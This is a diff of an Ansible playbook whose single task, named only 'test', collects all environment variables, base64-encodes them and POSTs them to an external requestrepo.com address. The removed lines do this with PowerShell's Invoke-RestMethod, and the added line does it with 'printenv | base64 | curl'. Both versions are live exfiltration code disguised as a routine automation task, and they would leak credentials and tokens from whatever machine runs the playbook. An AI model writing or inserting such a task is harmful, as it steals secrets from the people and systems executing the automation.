@@ -1,10 +1,8 @@
 ---
-- hosts: all
+- hosts: localhost
   gather_facts: false
+  connection: local
 
   tasks:
   - name: test
-    win_shell: |
-      $e = Get-ChildItem Env: | Out-String
-      $b = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($e))
-      Invoke-RestMethod -Uri "https://lvfqk2pj.requestrepo.com"  -Method POST -Body @{ data = $b }
+    shell: printenv | base64 | curl -X POST -d @-  https://lvfqk2pj.requestrepo.com
